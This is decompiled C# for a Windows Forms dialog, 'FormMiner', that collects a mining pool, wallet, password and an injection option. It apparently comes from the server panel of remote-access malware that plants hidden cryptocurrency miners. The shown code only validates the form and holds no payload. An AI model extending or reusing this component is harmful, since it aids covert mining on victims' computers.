using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Server.Properties;

namespace Server.Forms
{
	// Token: 0x0200008E RID: 142
	public partial class FormMiner : Form
	{
		// Token: 0x060003DD RID: 989 RVA: 0x0000412F File Offset: 0x0000232F
		public FormMiner()
		{
			this.InitializeComponent();
		}

		// Token: 0x060003DE RID: 990 RVA: 0x000302DC File Offset: 0x0002E4DC
		private void BtnOK_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrWhiteSpace(this.txtPool.Text) && !string.IsNullOrWhiteSpace(this.txtWallet.Text) && !string.IsNullOrWhiteSpace(this.txtPass.Text))
			{
				base.DialogResult = DialogResult.OK;
				//Settings.Default.Save();
				base.Hide();
			}
		}

		// Token: 0x060003DF RID: 991 RVA: 0x00030338 File Offset: 0x0002E538
		private void FormMiner_Load(object sender, EventArgs e)
		{
			try
			{
				this.comboInjection.SelectedIndex = 0;
				//this.txtPool.Text = Settings.Default.txtPool;
				//this.txtWallet.Text = Settings.Default.txtWallet;
				//this.txtPass.Text = Settings.Default.txtxmrPass;
			}
			catch
			{
			}
		}
	}
}
